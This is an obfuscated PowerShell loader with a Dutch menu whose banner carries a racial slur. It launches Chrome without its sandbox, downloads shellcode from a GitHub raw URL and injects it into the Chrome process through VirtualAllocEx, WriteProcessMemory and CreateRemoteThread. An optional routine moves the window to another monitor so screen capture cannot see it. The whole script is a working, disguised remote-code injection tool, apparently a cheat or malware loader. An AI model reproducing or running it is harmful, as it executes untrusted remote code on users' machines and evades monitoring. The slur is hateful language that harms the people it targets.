. ( $enV:comSpeC[4,26,25]-jOiN'') ( ('

Clear-Host
Write-Host DldDld
Write-Host Dld  ----------------------------------------'+'Dld -ForegroundColor Cyan
Write-Host Dld  '+'I '+'             '+'                        IDld -'+'Foregro'+'undColor Cyan
Write-Host Dld  I      '+' NIGGER BYPASS  v6.7        '+'    '+'IDld -ForegroundColor Cyan
Wr'+'ite-Host Dld  I       Gemaakt door: MJBP<3          IDld -Foregro'+'undColor Cyan'+'
Write-Ho'+'st Dld  I                   '+'                   IDld -Foregrou'+'ndColor Cyan
Write-Host D'+'ld  -------------'+'---------------------------Dld -ForegroundColor Cyan
Write-Host DldDld
Write-Host DldDld
Write-Host DldDld

Write-Host Dld[1] Streamp'+'roof versie.Dld -ForegroundCol'+'or Yellow
Write-Host Dld[2] Zonder Streamproof versie.Dld -ForegroundColor Yellow
r9gchoic'+'e1 = Read-Host DldMaak je keuze (1 of 2).Dld

if (r9gchoice1 -eq Dld1Dld) {
   '+' r9gurl = Dldhttps://raw.gi'+'thubusercontent.com/MJ06-B'+'P/bp/main/b'+'rowser.binD'+'ld
  '+'  r9guseNvidiaBypass = r9gfalse
    Write-Hos'+'t Dld[+] Streamproof versie gekozen.Dld -ForegroundColor Green
}
elseif (r'+'9g'+'choice1 -eq Dld2Dld) {
    r9gurl = Dldht'+'tps://raw.githubuserconten'+'t.com/MJ0'+'6-BP/bp/main/shellc'+'ode.binDld
    Write-Host Dld[1] Ja, Nvidia clip gebruiken.Dld -ForegroundColor Yellow
    Write-Host Dld[2] Nee, geen Nvidia cl'+'ip.Dld'+' -Fore'+'groundColor Yellow
 '+'   r9gnvidiaChoice = Read'+'-Host DldWil je Nvidia Byp'+'ass? (1 of 2)Dld
    r9guseNvidiaBypass = (r9gnvidiaChoice -eq Dld1Dld)
    if (r9guseNvidia'+'Bypass) {
        Write-Host Dld[+] Nvidia'+' Byp'+'ass ingeschakeld.Dld -ForegroundColor Green
    } else {
   '+'    '+' Writ'+'e-Hos'+'t Dld[+] Nvidia'+' Bypas'+'s uitgeschakeld.Dld -ForegroundColor Yellow
    }
}
else {
    Write-Host Dld[-] O'+'ngeldige '+'keuze!Dld -Foregrou'+'nd'+'Color '+'Red
    pause; exit
'+'}

r9gMonitorX = 0
r9gWidth = 1920
r9gH'+'eight = 1080
if (r9guseNvidiaBypass) {
    Write-Host DldD'+'ld
    Write-Host '+'Dl'+'d[1] Tweede mon'+'itor staat LINKS.Dld -Fo'+'regroundColor Yellow
    Writ'+'e-Host Dl'+'d[2] T'+'weed'+'e monitor staat RE'+'CHTS.D'+'ld -Foregrou'+'n'+'dColor Yellow
    r9gmonChoice = Read-Host DldMaak je keuze (1 of 2).Dld
 '+'   if (r9gmonChoice -eq Dld1Dld) { r9gMonitorX = -'+'1920 }
    elseif (r9gmonChoice -eq Dld2Dld) '+'{ r9gMonitorX = 1920 }
    else { Write-Hos'+'t Dld[-] Ongeldige keuze!Dld -ForegroundColor Red; pause; exit '+'}
}

if '+'(-not [Environment]::Is64BitProcess) {
    Write-Host Dld[-] Gebruik'+' 64-bit PowerShell als Administrator!Dld -Fo'+'regroundColor Red
    pause;'+' exit
}

funct'+'ion Invoke-Nvid'+'iaBypass {
    param([int]r9gTargetPID, [int]r9gMonitorX = -1920, [int]r9gWidth = 1920, [int]r9gHeight = 1080)
    Add-Ty'+'pe @Dld
using S'+'ystem'+';
using System.Runtime.InteropServices;
public c'+'lass Wi'+'n32 {
    [DllImport(Dl'+'duser32.dllD'+'ld)] public static exte'+'rn bool MoveWin'+'dow(IntPtr hWnd, int X, int Y, in'+'t nWidth, int nHeight, bool bRepaint);
   '+' [DllImport(Dlduser32.dllDld)] public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport(Dlduser32'+'.dllDld)] public static exte'+'rn ui'+'nt '+'GetWindowThreadProcessId(Int'+'Ptr hWnd, out uint lpdwProcessId);
}
Dld@ -ErrorAction SilentlyContinue

    r9gprocess = Get-Process -Id r9gTar'+'getPID -ErrorAction SilentlyContinue
    if (-not r9gprocess) { Write-Host Dld[-] '+'Proces niet gevond'+'enDld -Foreground'+'Color Red; '+'return }

    r9ghwnd = r9g'+'process.MainWindo'+'wHandle
'+'
    #'+' Fallback als MainWindowHandle leeg is
   '+' if '+'(r9ghwnd -eq [IntPtr]::Zero) {
        r9ghwnd = [IntPtr]::Zero
        r'+'9gcallback = {
            param(r9ghWnd, '+'r9glParam)
            r9'+'gprocId = 0
  '+'          [Win32]::GetWindowThre'+'adProcessId(r9ghW'+'nd, '+'[ref]r9gprocId) Xni Out-Null
            if (r9gprocId -e'+'q r9gTargetPID) { r9gs'+'c'+'ript:hwnd = r9ghWnd; return r9gfalse }
   '+'         return r9gtrue
     '+'   }
        r9gdelegate = New-Object System.Func[IntPtr, Int'+'Ptr, bool] r9gcallback
       '+' [Win32]::EnumWindows(r9gdelegate, [IntPtr]::Zero) Xni Out-Null
    }

    if (r9ghwnd -eq [IntPt'+'r]:'+':Ze'+'ro) {
      '+'  Writ'+'e-Host Dld[-] Geen '+'venster gevondenDld -ForegroundColor Red
        return
    }

    [Win32]::SetForegroundWindow(r9ghwnd) Xni Out-Null
    for ('+'r9gi = '+'1;'+' r9gi -le '+'6; r9gi++) {
        [Win32]::MoveWindow(r9ghw'+'nd, r9gMonitorX, 0, r9gWidth, r9gHeight, r'+'9gtrue) Xni Out-Null
        Start-Sleep -Milliseconds 150
    }
}
'+'

try {
    Start-Process Dldchrome.exeDld -A'+'rgumentList Dld--no-sandbox -'+'-start-maxi'+'mizedDld
    Start-Sleep 2
} catch {
    Write-Host Dld[-] '+'Kon Chrome niet s'+'tarten. Zorg dat Chrome ge?nstalle'+'erd is.Dld -ForegroundColor Red
    pause; exit
}

r9gtargetProcess = Get-Process -Name DldchromeDld Xni Where-Object { r9g_.MainWindowTitle -ne DldDld } Xni Select-Object -First 1
if (-not r9gtargetProcess) {
    Write-Host Dld[-] Geen venste'+'r met titel gevonden ? laagste memory procesDld -ForegroundColor Yellow
    r9gtargetProcess = Get-Process -Name Dldc'+'hromeDld Xni Sor'+'t-Ob'+'ject WorkingSet64 Xni Select-Object -First 1
'+'}

r9gtargetPID = r9gtargetProcess.Id
W'+'rite-Host Dld[+] Chrom'+'e PID: r9gtargetPIDDld -ForegroundColor Green

if ('+'r9guseNvidiaBypass) {
    Start-Sle'+'ep -Millisecon'+'d'+'s 2000'+'
  '+'  Invoke-Nv'+'idiaBypass -TargetPID r9gtarget'+'PID -Moni'+'torX r9gMonitorX
}

try {
    r9gshellcode = (New-Object Net.WebClient).DownloadData(r9gurl)
} catch {
    Write-Host Dld[-] Download mislukt: r9g(r9'+'g_.Exceptio'+'n.Me'+'ssage)Dld -ForegroundColor Red
    pause; exit
}

r9gsize = r'+'9gshellcode.Length

Add-Type -MemberDefinition @Dld
    [D'+'llImport(Dldkernel32.dllDl'+'d)]'+' public static extern IntPtr OpenProcess(uint dwDesire'+'dAc'+'cess,'+' bool bInheritHandle, uint '+'dwProcessId);
    [DllImport('+'Dldkernel32.dllDld)] public static extern IntPtr Vir'+'t'+'ualAllocEx(IntPtr hProces'+'s,'+' IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flP'+'rotect);
    [DllImport(Dldkernel32.dllDld)] public static extern bool'+' WriteProcessM'+'emory(IntPtr hProcess, IntPtr lpBas'+'eAddress, byte[] lpBuffe'+'r, uint nSize, out UIntPtr lpNumbe'+'rOfByt'+'esWrit'+'ten);
    [DllImport(Dldkern'+'el32.dllDld)] public static extern bool VirtualProtectEx'+'(IntPtr hProcess, IntPtr lpAddress, uint dwS'+'ize, '+'uint flNewProtec'+'t, out uint lpfl'+'OldProtect);
    [DllImport(Dldkernel32'+'.dllDld)] public static extern IntPtr Creat'+'eRemoteThread(IntPtr hProcess, Int'+'Ptr lpThreadAttributes, u'+'int dwStackS'+'ize'+', IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport(Dldke'+'rnel32.dllDld)] public static extern bool CloseHandle(IntP'+'tr hObject);
Dld'+'@ -Name Win32 -Namespace Native -PassThru

try {
    r9ghProcess = [Nati'+'ve.Win32]::OpenProces'+'s(0x001F0FFF, r9gfalse, r9'+'gtargetPID'+')
    if (r9ghProcess -eq [IntP'+'tr]::Zero) { 
        throw DldOpenProcess mislukt. Script moet als Admi'+'nistrator draaien!Dld 
    }

    r9gaddr = [Native.Win32]:'+':VirtualAllocEx(r9ghProces'+'s, [IntPtr]::'+'Zero, [uint32]r9gsize, 0x3000, 0x40)
    r9gbyt'+'esWr'+'itten = [UIntPtr]::Zero
    [Nat'+'ive.Win3'+'2]::WriteProcessMemory(r9ghProcess, r9gaddr, r9gshellcode, [uint32]r9gsize, [ref]r9gbyt'+'esWritten) Xni Out-N'+'ull
 '+'   [Native.Win32]::VirtualProtectEx(r9ghProcess, r9gaddr, [uin'+'t32]r9gsize, 0x20, ['+'ref]r9gnull) Xni Out-Null
    [Native.Win32]::CreateRemoteThread(r9ghProcess, [IntPtr]::Zero, 0, r9gaddr, [IntPtr]::Zero, 0, [ref]'+'r9gnull) X'+'ni Out-Null

    Write-Host Dld[+] Injectie succesvol!Dld -'+'ForegroundColor Green
}
catch {
    Write-Host Dld[-] Injectie mislukt: r9g(r9g_.E'+'xception.Message)Dld -Foregroun'+'dColor Red
  '+'  pause; exit
}
finally {
    if (r9ghP'+'rocess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle(r9gh'+'Proces'+'s) Xni Out-Null }
}

if (r9guseNvidiaBypass) {
    Start-Sleep -Mil'+'liseconds 2500
    Invoke-NvidiaBypass -TargetPID r9gtargetPID -MonitorX r9gMonitorX
}
Clear-Host
Write-Host Dld[!] Laat Chrome '+'open staan! - deze CMD wegklikkenDld -ForegroundColor Red
Wr'+'ite-Host Dl'+'d[-] Om te cleanen: druk op END en daarna sluit Chrome helemaal af.Dld -'+'Foregrou'+'ndColor '+'Yellow
Write-'+'Host Dld#CLEANDld -Fo'+'regroundColor Cyan
').REPlAce(([CHAr]68+[CHAr]108+[CHAr]100),[sTRING][CHAr]34).REPlAce(([CHAr]114+[CHAr]57+[CHAr]103),'$').REPlAce(([CHAr]88+[CHAr]110+[CHAr]105),[sTRING][CHAr]124) )
